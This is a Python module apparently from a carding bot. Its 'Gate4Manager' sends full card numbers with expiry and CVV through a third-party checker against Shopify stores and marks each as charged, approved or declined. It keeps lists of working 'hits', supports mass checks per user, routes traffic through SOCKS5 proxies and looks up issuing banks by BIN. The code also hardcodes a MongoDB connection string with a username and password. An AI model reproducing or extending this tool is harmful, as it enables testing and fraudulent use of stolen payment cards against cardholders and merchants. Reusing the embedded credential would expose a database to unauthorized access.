import asyncio
import aiohttp
import aiohttp_socks
import time
import json
import random
import string
import os
from datetime import datetime, timedelta
from typing import Dict, List, Optional, Tuple, Any
from dataclasses import dataclass
from pymongo import MongoClient
from collections import defaultdict
import re

# MongoDB Setup
MONGO_URI = "mongodb+srv://ElectraOp:BGMI272@cluster0.1jmwb.mongodb.net/?retryWrites=true&w=majority&appName=Cluster0"
DB_NAME = "fn_bot"
client = MongoClient(MONGO_URI)
db = client[DB_NAME]
user_sites_col = db["user_sites"]
mass_checks_col = db["mass_checks"]
sites_txt_col = db["sites_txt"]
active_checks_col = db["active_checks"]

@dataclass
class Gate4Result:
    status: str
    response: str
    price: str
    gateway: str
    card: str
    card_info: str = ""
    issuer: str = ""
    country: str = ""
    flag: str = ""
    currency: str = ""
    elapsed_time: float = 0.0
    proxy_status: str = ""
    site_used: str = ""
    message: str = ""
    bank: str = ""
    brand: str = ""
    type: str = ""
    level: str = ""

class Gate4Manager:
    def __init__(self):
        self.session = None
        self.user_locks = defaultdict(asyncio.Lock)
        self.active_checks = {}
        self.user_check_data = {}
        self.bad_sites = set()
        self.sites_cache = []
        self.global_sites = []
        self.last_site_load = 0
        self.site_load_interval = 300  # 5 minutes
        self.load_global_sites()
        
    async def get_session(self):
        if self.session is None or self.session.closed:
            timeout = aiohttp.ClientTimeout(total=30)
            self.session = aiohttp.ClientSession(timeout=timeout)
        return self.session
    
    async def close_session(self):
        if self.session and not self.session.closed:
            await self.session.close()
    
    def load_global_sites(self):
        """Load sites from sites.txt file"""
        try:
            if os.path.exists("sites.txt"):
                with open("sites.txt", "r", encoding='utf-8') as f:
                    sites = [line.strip() for line in f if line.strip() and not line.startswith('#')]
                    self.global_sites = sites
                    self.sites_cache = [site for site in sites if site not in self.bad_sites]
                    self.last_site_load = time.time()
                    print(f"Loaded {len(self.sites_cache)} sites from sites.txt")
            else:
                print("sites.txt not found, creating empty file")
                with open("sites.txt", "w") as f:
                    f.write("# Add your Shopify sites here\n")
                    f.write("https://scorenn.com\n")
                self.global_sites = ["https://scorenn.com"]
                self.sites_cache = ["https://scorenn.com"]
        except Exception as e:
            print(f"Error loading sites.txt: {e}")
            self.global_sites = ["https://scorenn.com"]
            self.sites_cache = ["https://scorenn.com"]
    
    def reload_sites_cache(self):
        """Reload sites cache excluding bad sites"""
        self.sites_cache = [site for site in self.global_sites if site not in self.bad_sites]
        self.last_site_load = time.time()
    
    async def get_site_for_user(self, user_id: int) -> str:
        """Get site for user - first check user's sites, then global sites.txt"""
        # Check user's saved sites
        user_sites = list(user_sites_col.find({"user_id": user_id, "active": True}))
        user_sites_list = [site["site"] for site in user_sites]
        
        if user_sites_list:
            # Remove bad sites from user's list
            user_sites_list = [site for site in user_sites_list if site not in self.bad_sites]
            if user_sites_list:
                return random.choice(user_sites_list)
        
        # Fall back to global sites.txt
        current_time = time.time()
        if not self.sites_cache or (current_time - self.last_site_load) > self.site_load_interval:
            self.reload_sites_cache()
        
        if self.sites_cache:
            return random.choice(self.sites_cache)
        
        return "https://scorenn.com"
    
    async def check_site(self, site: str) -> Tuple[bool, str]:
        """Check if a site works with the API"""
        try:
            test_card = "4242424242424242|01|29|123"
            result = await self.check_card(test_card, site, test_mode=True)
            
            if result.status == "Error":
                return False, result.message
            return True, "Site is working"
        except Exception as e:
            return False, str(e)
    
    async def perform_bin_lookup(self, cc: str, proxy: str = None) -> Dict[str, Any]:
        """Perform BIN lookup for card details"""
        start_time = time.time()
        
        try:
            # Clean the card number
            cc_clean = cc.replace(" ", "").split('|')[0][:6]
            
            # Set up proxy connector if proxy is available
            connector = None
            if proxy:
                try:
                    # Parse proxy
                    if ':' in proxy:
                        parts = proxy.split(':')
                        if len(parts) == 2:
                            host, port = parts[0], int(parts[1])
                            connector = aiohttp_socks.ProxyConnector.from_url(
                                f'socks5://{host}:{port}'
                            )
                        elif len(parts) == 4:
                            username, password, host, port = parts
                            connector = aiohttp_socks.ProxyConnector.from_url(
                                f'socks5://{username}:{password}@{host}:{port}'
                            )
                except Exception as e:
                    print(f"Proxy setup error: {e}")
            
            # Make BIN lookup request
            async with aiohttp.ClientSession(connector=connector) as session:
                async with session.get(
                    f'https://bins.antipublic.cc/bins/{cc_clean}', 
                    timeout=15
                ) as response:
                    
                    if response.status != 200:
                        return {
                            "success": False,
                            "message": "BIN Lookup failed",
                            "elapsed_time": time.time() - start_time
                        }
                    
                    data = await response.json()
                    
                    return {
                        "success": True,
                        "bin": data.get('bin', ''),
                        "bank": data.get('bank', ''),
                        "brand": data.get('brand', ''),
                        "type": data.get('type', ''),
                        "level": data.get('level', ''),
                        "country": data.get('country_name', ''),
                        "flag": data.get('country_flag', '🏳️'),
                        "currency": data.get('country_currencies', ['USD'])[0] if data.get('country_currencies') else "USD",
                        "elapsed_time": time.time() - start_time
                    }
                    
        except asyncio.TimeoutError:
            return {
                "success": False,
                "message": "BIN Lookup timed out",
                "elapsed_time": time.time() - start_time
            }
        except Exception as e:
            return {
                "success": False,
                "message": f"BIN Lookup error: {str(e)}",
                "elapsed_time": time.time() - start_time
            }
    
    async def check_card(self, card: str, site: str = None, proxy: str = None, test_mode: bool = False) -> Gate4Result:
        """Check a single card using the API"""
        start_time = time.time()
        
        try:
            if not site:
                site = "https://scorenn.com"
            
            # Format card
            card = card.strip()
            
            # Prepare API URL
            if proxy:
                api_url = f"https://notconfirm.com/index.php?site={site}&cc={card}&proxy={proxy}"
            else:
                api_url = f"https://notconfirm.com/index.php?site={site}&cc={card}"
            
            # Make API request
            session = await self.get_session()
            async with session.get(api_url, timeout=30) as response:
                response_text = await response.text()
                
                if response.status != 200:
                    return Gate4Result(
                        status="Error",
                        response="API Error",
                        price="0.00",
                        gateway="Unknown",
                        card=card,
                        elapsed_time=time.time() - start_time,
                        proxy_status=proxy or "No Proxy",
                        site_used=site,
                        message=f"API returned status {response.status}"
                    )
                
                try:
                    data = json.loads(response_text)
                    response_msg = data.get("Response", "").upper()
                    
                    # Determine status based on response
                    if any(keyword in response_msg for keyword in ["thank", "thank you", "Thank You", "Order # confirmed"]):
                        status = "Charged"
                    elif "ACTIONREQUIRED" in response_msg or "ACTION_REQUIRED" in response_msg:
                        status = "Approved"
                    elif "CARD_DECLINED" in response_msg or "DECLINED" in response_msg:
                        status = "Declined"
                    elif data.get("Status", "").lower() == "true":
                        status = "Approved"
                    else:
                        status = "Declined"
                    
                    # Perform BIN lookup (only in non-test mode)
                    bin_data = {}
                    if not test_mode:
                        bin_data = await self.perform_bin_lookup(card, proxy)
                    
                    # Format card info
                    card_parts = card.split('|')
                    if len(card_parts) >= 4:
                        card_num = card_parts[0]
                        card_info = f"{card_num[:6]}******{card_num[-4:]} | {card_parts[1]}/{card_parts[2]}"
                    else:
                        card_info = card
                    
                    # Create result
                    result = Gate4Result(
                        status=status,
                        response=data.get("Response", "Unknown"),
                        price=data.get("Price", "0.00"),
                        gateway=data.get("Gateway", "Unknown"),
                        card=card,
                        card_info=card_info,
                        issuer=bin_data.get("bank", "") if bin_data.get("success") else "",
                        country=bin_data.get("country", "") if bin_data.get("success") else "",
                        flag=bin_data.get("flag", "🏳️") if bin_data.get("success") else "🏳️",
                        currency=bin_data.get("currency", "USD") if bin_data.get("success") else "USD",
                        elapsed_time=time.time() - start_time,
                        proxy_status=proxy or "No Proxy",
                        site_used=site,
                        message=data.get("Response", "")
                    )
                    
                    # Add BIN data if available
                    if bin_data.get("success"):
                        result.bank = bin_data.get("bank", "")
                        result.brand = bin_data.get("brand", "")
                        result.type = bin_data.get("type", "")
                        result.level = bin_data.get("level", "")
                    
                    return result
                    
                except json.JSONDecodeError:
                    # Try to extract status from raw response
                    response_upper = response_text.upper()
                    if "THANK" in response_upper or "SUCCESS" in response_upper:
                        status = "Charged"
                    elif "DECLINED" in response_upper:
                        status = "Declined"
                    else:
                        status = "Error"
                    
                    return Gate4Result(
                        status=status,
                        response=response_text[:100],
                        price="0.00",
                        gateway="Unknown",
                        card=card,
                        elapsed_time=time.time() - start_time,
                        proxy_status=proxy or "No Proxy",
                        site_used=site,
                        message=f"Invalid JSON: {response_text[:100]}"
                    )
                    
        except asyncio.TimeoutError:
            return Gate4Result(
                status="Error",
                response="Timeout",
                price="0.00",
                gateway="Unknown",
                card=card,
                elapsed_time=time.time() - start_time,
                proxy_status=proxy or "No Proxy",
                site_used=site,
                message="Request timeout"
            )
        except Exception as e:
            return Gate4Result(
                status="Error",
                response="Exception",
                price="0.00",
                gateway="Unknown",
                card=card,
                elapsed_time=time.time() - start_time,
                proxy_status=proxy or "No Proxy",
                site_used=site,
                message=str(e)
            )
    
    def mark_site_bad(self, site: str):
        """Mark a site as bad (not working)"""
        self.bad_sites.add(site)
        user_sites_col.update_many(
            {"site": site},
            {"$set": {"active": False, "marked_bad_at": datetime.utcnow()}}
        )
        # Remove from cache
        if site in self.sites_cache:
            self.sites_cache.remove(site)
    
    def add_user_check(self, user_id: int, total_cards: int):
        """Add a new mass check for user"""
        check_id = f"{user_id}_{int(time.time())}"
        self.user_check_data[user_id] = {
            "check_id": check_id,
            "start_time": time.time(),
            "total": total_cards,
            "checked": 0,
            "charged": 0,
            "approved": 0,
            "declined": 0,
            "hits": [],
            "declined_list": [],
            "stop": False
        }
        return check_id
    
    def update_user_check(self, user_id: int, result: Gate4Result):
        """Update user check stats"""
        if user_id not in self.user_check_data:
            return
        
        data = self.user_check_data[user_id]
        data["checked"] += 1
        
        if result.status == "Charged":
            data["charged"] += 1
            data["hits"].append(result.card)
        elif result.status == "Approved":
            data["approved"] += 1
            data["hits"].append(result.card)
        elif result.status == "Declined":
            data["declined"] += 1
            data["declined_list"].append(result.card)
    
    def stop_user_check(self, user_id: int) -> bool:
        """Stop a user's mass check"""
        if user_id in self.user_check_data:
            self.user_check_data[user_id]["stop"] = True
            return True
        return False
    
    def get_user_check_data(self, user_id: int):
        """Get user's current check data"""
        return self.user_check_data.get(user_id)
    
    def remove_user_check(self, user_id: int):
        """Remove user check data"""
        if user_id in self.user_check_data:
            del self.user_check_data[user_id]
    
    def add_mass_sites(self, sites: List[str]):
        """Add multiple sites to global list"""
        try:
            # Read existing sites
            existing_sites = set()
            if os.path.exists("sites.txt"):
                with open("sites.txt", "r", encoding='utf-8') as f:
                    existing_sites = set(line.strip() for line in f if line.strip() and not line.startswith('#'))
            
            # Add new sites
            added_count = 0
            with open("sites.txt", "a", encoding='utf-8') as f:
                for site in sites:
                    site = site.strip()
                    if site and site not in existing_sites:
                        f.write(f"{site}\n")
                        existing_sites.add(site)
                        added_count += 1
            
            # Reload cache
            self.load_global_sites()
            return added_count, len(existing_sites)
            
        except Exception as e:
            print(f"Error adding mass sites: {e}")
            return 0, 0
    
    def remove_site_from_file(self, site: str) -> bool:
        """Remove a site from sites.txt"""
        try:
            if not os.path.exists("sites.txt"):
                return False
            
            with open("sites.txt", "r", encoding='utf-8') as f:
                lines = f.readlines()
            
            with open("sites.txt", "w", encoding='utf-8') as f:
                removed = False
                for line in lines:
                    if line.strip() != site and (line.strip() or line.startswith('#')):
                        f.write(line)
                    elif line.strip() == site:
                        removed = True
            
            if removed:
                self.load_global_sites()
            
            return removed
            
        except Exception as e:
            print(f"Error removing site: {e}")
            return False

# Global gate4 manager
gate4_manager = Gate4Manager()
